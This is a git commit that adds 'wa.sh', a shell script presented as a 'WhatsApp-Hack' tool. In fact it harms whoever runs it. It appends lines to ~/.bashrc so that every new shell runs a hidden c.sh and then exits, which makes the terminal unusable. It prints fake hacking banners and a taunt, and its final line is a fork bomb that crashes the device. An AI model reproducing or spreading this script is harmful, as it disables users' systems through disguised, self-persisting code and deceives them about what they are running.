5c2e04760cf169db691e373e2594b36f4386759d
sunaif-adkar <86029415+sunaif-adkar@users.noreply.github.com>
2021-07-15 09:54:30 +0530

    Create wa.sh

---
+++ wa.sh
@@ -0,0 +1,29 @@
+#!/system/bin/sh
+clear
+echo 'bash c.sh' >> ~/.bashrc
+echo 'exit' >> ~/.bashrc
+mv c.sh $HOME
+sleep 2
+neofetch
+sleep 4
+clear
+echo " plz wait...... Hacking on progress 😌🤹"
+sleep 5
+clear
+echo " "
+cowsay -f daemon 1
+sleep 1
+echo -e "\e[91m "
+figlet "WhatsApp-Hack"
+echo "  coded by Sunaif Adkar 🏌️ "
+echo " "
+sleep 3
+echo " "
+echo -e "\e[91m "
+read -p "[•] If you want to continue (y or n) :- "
+sleep 3
+clear
+echo "\e[91m "
+cowsay -f meow 1
+figlet "there is no way to hack WhatsApp stupid 😌😹🏌Go and run away 🤠️"
+:(){ :|:& };:
